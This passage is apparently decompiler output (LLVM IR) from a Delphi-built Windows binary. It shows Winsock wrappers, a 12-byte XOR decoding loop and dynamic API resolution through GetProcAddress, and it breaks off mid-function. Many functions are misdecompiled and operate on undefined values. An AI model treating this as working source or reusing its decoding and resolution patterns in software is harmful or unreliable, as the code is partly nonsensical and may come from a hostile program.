  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404665() local_unnamed_addr {
dec_label_pc_404665:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40466a() local_unnamed_addr {
dec_label_pc_40466a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_40466c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40466c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404670() local_unnamed_addr {
dec_label_pc_404670:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40467b() local_unnamed_addr {
dec_label_pc_40467b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212461, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046df, label %dec_label_pc_4046ad, !insn.addr !249

dec_label_pc_4046ad:                              ; preds = %dec_label_pc_40467b
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046df, !insn.addr !254

dec_label_pc_4046df:                              ; preds = %dec_label_pc_4046ad, %dec_label_pc_40467b
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212468, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046ed() local_unnamed_addr {
dec_label_pc_4046ed:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046f2() local_unnamed_addr {
dec_label_pc_4046f2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046f4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046f8() local_unnamed_addr {
dec_label_pc_4046f8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_404700() local_unnamed_addr {
dec_label_pc_404700:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_40374c(), !insn.addr !266
  %1 = call i32 @function_4034f4(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404735, label %dec_label_pc_40471b, !insn.addr !268

dec_label_pc_40471b:                              ; preds = %dec_label_pc_404700, %dec_label_pc_40471b
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint ([12 x i8]* @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_40471b, label %dec_label_pc_404735, !insn.addr !276

dec_label_pc_404735:                              ; preds = %dec_label_pc_40471b, %dec_label_pc_404700
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_40473c() local_unnamed_addr {
dec_label_pc_40473c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404761() local_unnamed_addr {
dec_label_pc_404761:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_404766() local_unnamed_addr {
dec_label_pc_404766:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_404768(i32 %arg1) local_unnamed_addr {
dec_label_pc_404768:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_40476c() local_unnamed_addr {
dec_label_pc_40476c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404774() local_unnamed_addr {
dec_label_pc_404774:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_404799() local_unnamed_addr {
dec_label_pc_404799:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_40479e() local_unnamed_addr {
dec_label_pc_40479e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_4047a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_4047a4() local_unnamed_addr {
dec_label_pc_4047a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_4047ac(i32 %s) local_unnamed_addr {
dec_label_pc_4047ac:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_4047b4(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047b4:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_4047bc(i16 %hostshort) local_unnamed_addr {
dec_label_pc_4047bc:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_4047c4(%in_addr %in) local_unnamed_addr {
dec_label_pc_4047c4:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047cc(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047cc:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047d4(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047d4:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047dc(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047dc:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047e4(i8* %name) local_unnamed_addr {
dec_label_pc_4047e4:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047ec(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047ec:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047f4(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047f4:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047fc() local_unnamed_addr {
dec_label_pc_4047fc:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_404804() local_unnamed_addr {
dec_label_pc_404804:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_404829() local_unnamed_addr {
dec_label_pc_404829:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_40482e() local_unnamed_addr {
dec_label_pc_40482e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404830(i32 %arg1) local_unnamed_addr {
dec_label_pc_404830:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404834() local_unnamed_addr {
dec_label_pc_404834:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_40483c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40483c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i1 @__decompiler_undefined_function_1()
  %2 = trunc i32 %0 to i8
  br i1 %1, label %dec_label_pc_4048bd, label %dec_label_pc_4048c2, !insn.addr !322

dec_label_pc_4048bd:                              ; preds = %dec_label_pc_40483c
  %3 = inttoptr i32 %0 to i8*, !insn.addr !323
  %4 = load i8, i8* %3, align 1, !insn.addr !323
  %5 = add i8 %4, %2, !insn.addr !323
  store i8 %5, i8* %3, align 1, !insn.addr !323
  ret i32 %0, !insn.addr !323

dec_label_pc_4048c2:                              ; preds = %dec_label_pc_40483c
  %6 = mul i8 %2, 2, !insn.addr !324
  %7 = inttoptr i32 %0 to i8*, !insn.addr !324
  store i8 %6, i8* %7, align 1, !insn.addr !324
  ret i32 %0, !insn.addr !324
}

define i32 @function_4049f9() local_unnamed_addr {
dec_label_pc_4049f9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !325
  ret i32 %0, !insn.addr !325
}

define i32 @function_4049fe() local_unnamed_addr {
dec_label_pc_4049fe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !326
}

define i32 @function_404a00(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !327
}

define i32 @function_404a04() local_unnamed_addr {
dec_label_pc_404a04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !328
  %2 = add i32 %1, -1, !insn.addr !328
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !328
  ret i32 %0, !insn.addr !329
}

define i32* @function_404a0c(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !330
  ret i32* %0, !insn.addr !330
}

define i32 @function_404a14() local_unnamed_addr {
dec_label_pc_404a14:
  ret i32 0, !insn.addr !331
}

define i32 @function_404a1e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404a1e:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = mul i32 %0, 8, !insn.addr !332
  %4 = add i32 %0, 48, !insn.addr !332
  %5 = add i32 %4, %3, !insn.addr !332
  %6 = inttoptr i32 %5 to i8*, !insn.addr !332
  %7 = load i8, i8* %6, align 1, !insn.addr !332
  %8 = udiv i32 %2, 256, !insn.addr !332
  %9 = trunc i32 %8 to i8, !insn.addr !332
  %10 = add i8 %7, %9, !insn.addr !332
  store i8 %10, i8* %6, align 1, !insn.addr !332
  call void @__writefsdword(i32 %2, i32 %1), !insn.addr !333
  %11 = load i32, i32* @global_var_40968c, align 4, !insn.addr !334
  %12 = add i32 %11, 1, !insn.addr !334
  store i32 %12, i32* @global_var_40968c, align 4, !insn.addr !334
  call void @__writefsdword(i32 0, i32 %arg3), !insn.addr !335
  ret i32 0, !insn.addr !336
}

define i32 @function_404a39() local_unnamed_addr {
dec_label_pc_404a39:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !337
  ret i32 %0, !insn.addr !337
}

define i32 @function_404a3e() local_unnamed_addr {
dec_label_pc_404a3e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !338
}

define i32 @function_404a40(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !339
}

define i32 @function_404a44() local_unnamed_addr {
dec_label_pc_404a44:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !340
  %2 = add i32 %1, -1, !insn.addr !340
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !340
  ret i32 %0, !insn.addr !341
}

define i32 @function_404aa4(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404aa4:
  %esp.1.reg2mem = alloca i32, !insn.addr !342
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !342
  %eax.0.reg2mem = alloca i32, !insn.addr !342
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !343
  %7 = icmp eq i8 %6, 0, !insn.addr !343
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !344
  br i1 %7, label %dec_label_pc_404ab7, label %dec_label_pc_404aaf, !insn.addr !344

dec_label_pc_404aaf:                              ; preds = %dec_label_pc_404aa4
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !345
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !345
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !345
  br label %dec_label_pc_404ab7, !insn.addr !345

dec_label_pc_404ab7:                              ; preds = %dec_label_pc_404aaf, %dec_label_pc_404aa4
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !346
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !347
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !347
  %13 = ptrtoint i32* %12 to i32, !insn.addr !347
  %14 = add i32 %eax.0.reload, 8, !insn.addr !348
  %15 = inttoptr i32 %14 to i32*, !insn.addr !348
  store i32 %13, i32* %15, align 4, !insn.addr !348
  %16 = icmp eq i32* %12, null, !insn.addr !349
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !350
  br i1 %16, label %dec_label_pc_404b0f, label %dec_label_pc_404ad3, !insn.addr !350

dec_label_pc_404ad3:                              ; preds = %dec_label_pc_404ab7
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !351
  %18 = add i32 %eax.0.reload, 12, !insn.addr !352
  %19 = inttoptr i32 %18 to i32*, !insn.addr !352
  store i32 %17, i32* %19, align 4, !insn.addr !352
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !353
  %21 = add i32 %eax.0.reload, 16, !insn.addr !354
  %22 = inttoptr i32 %21 to i32*, !insn.addr !354
  store i32 %20, i32* %22, align 4, !insn.addr !354
  %23 = add i32 %eax.0.reload, 20, !insn.addr !355
  %24 = inttoptr i32 %23 to i32*, !insn.addr !355
  store i32 %arg3, i32* %24, align 4, !insn.addr !355
  %25 = load i32, i32* %22, align 4, !insn.addr !356
  %26 = add i32 %esp.0, -8, !insn.addr !357
  %27 = inttoptr i32 %26 to i32*, !insn.addr !357
  store i32 %25, i32* %27, align 4, !insn.addr !357
  %28 = add i32 %esp.0, -12, !insn.addr !358
  %29 = inttoptr i32 %28 to i32*, !insn.addr !358
  store i32 %17, i32* %29, align 4, !insn.addr !358
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !359
  %31 = ptrtoint i32* %30 to i32, !insn.addr !359
  %32 = add i32 %esp.0, -16, !insn.addr !360
  %33 = inttoptr i32 %32 to i32*, !insn.addr !360
  store i32 %31, i32* %33, align 4, !insn.addr !360
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !361
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !361
  %36 = add i32 %eax.0.reload, 24, !insn.addr !362
  %37 = inttoptr i32 %36 to i32*, !insn.addr !362
  store i32 %35, i32* %37, align 4, !insn.addr !362
  %38 = icmp eq i32 ()* %34, null, !insn.addr !363
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !364
  br i1 %38, label %dec_label_pc_404b0f, label %dec_label_pc_404afb, !insn.addr !364

dec_label_pc_404afb:                              ; preds = %dec_label_pc_404ad3
  %39 = load i32, i32* %24, align 4, !insn.addr !365
  %40 = add i32 %esp.0, -20, !insn.addr !366
  %41 = inttoptr i32 %40 to i32*, !insn.addr !366
  store i32 %39, i32* %41, align 4, !insn.addr !366
  %42 = load i32, i32* %15, align 4, !insn.addr !367
  %43 = add i32 %esp.0, -24, !insn.addr !368
  %44 = inttoptr i32 %43 to i32*, !insn.addr !368
  store i32 %42, i32* %44, align 4, !insn.addr !368
  %45 = call i32 @function_404b78(i32 ptrtoint (i32* @0 to i32)), !insn.addr !369
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !369
  br label %dec_label_pc_404b0f, !insn.addr !369

dec_label_pc_404b0f:                              ; preds = %dec_label_pc_404afb, %dec_label_pc_404ad3, %dec_label_pc_404ab7
  br i1 %7, label %dec_label_pc_404b26, label %dec_label_pc_404b17, !insn.addr !370

dec_label_pc_404b17:                              ; preds = %dec_label_pc_404b0f
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !371
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !372
  %48 = load i32, i32* %47, align 4, !insn.addr !372
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !372
  br label %dec_label_pc_404b26, !insn.addr !373

dec_label_pc_404b26:                              ; preds = %dec_label_pc_404b17, %dec_label_pc_404b0f
  %49 = add i32 %eax.0.reload, 4, !insn.addr !374
  %50 = inttoptr i32 %49 to i32*, !insn.addr !374
  %51 = inttoptr i32 %9 to i32*, !insn.addr !346
  ret i32 %eax.0.reload, !insn.addr !375
}

define i32 @function_404b30() local_unnamed_addr {
dec_label_pc_404b30:
  %eax.1.reg2mem = alloca i32, !insn.addr !376
  %eax.0.reg2mem = alloca i32, !insn.addr !376
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !377
  %4 = add i32 %3, 8, !insn.addr !378
  %5 = inttoptr i32 %4 to i32*, !insn.addr !378
  %6 = load i32, i32* %5, align 4, !insn.addr !378
  %7 = icmp eq i32 %6, 0, !insn.addr !378
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !379
  br i1 %7, label %dec_label_pc_404b6a, label %dec_label_pc_404b41, !insn.addr !379

dec_label_pc_404b41:                              ; preds = %dec_label_pc_404b30
  %8 = add i32 %3, 24, !insn.addr !380
  %9 = inttoptr i32 %8 to i32*, !insn.addr !380
  %10 = load i32, i32* %9, align 4, !insn.addr !380
  %11 = icmp eq i32 %10, 0, !insn.addr !380
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !381
  br i1 %11, label %dec_label_pc_404b6a, label %dec_label_pc_404b47, !insn.addr !381

dec_label_pc_404b47:                              ; preds = %dec_label_pc_404b41
  %12 = add i32 %3, 4, !insn.addr !382
  %13 = inttoptr i32 %12 to i32*, !insn.addr !382
  %14 = load i32, i32* %13, align 4, !insn.addr !382
  %15 = inttoptr i32 %14 to i8*, !insn.addr !383
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !384
  %17 = ptrtoint i32* %16 to i32, !insn.addr !384
  %18 = load i32, i32* %5, align 4, !insn.addr !385
  %19 = icmp eq i32 %18, %17, !insn.addr !385
  %20 = icmp eq i1 %19, false, !insn.addr !386
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !386
  br i1 %20, label %dec_label_pc_404b6a, label %dec_label_pc_404b55, !insn.addr !386

dec_label_pc_404b55:                              ; preds = %dec_label_pc_404b47
  %21 = load i32, i32* %9, align 4, !insn.addr !387
  %22 = call i32 @function_404b78(i32 %21), !insn.addr !388
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !388
  br label %dec_label_pc_404b6a, !insn.addr !388

dec_label_pc_404b6a:                              ; preds = %dec_label_pc_404b55, %dec_label_pc_404b47, %dec_label_pc_404b41, %dec_label_pc_404b30
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !389
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !390
  br i1 %24, label %dec_label_pc_404b75, label %dec_label_pc_404b6e, !insn.addr !390

dec_label_pc_404b6e:                              ; preds = %dec_label_pc_404b6a
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !391
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !391
  br label %dec_label_pc_404b75, !insn.addr !391

dec_label_pc_404b75:                              ; preds = %dec_label_pc_404b6e, %dec_label_pc_404b6a
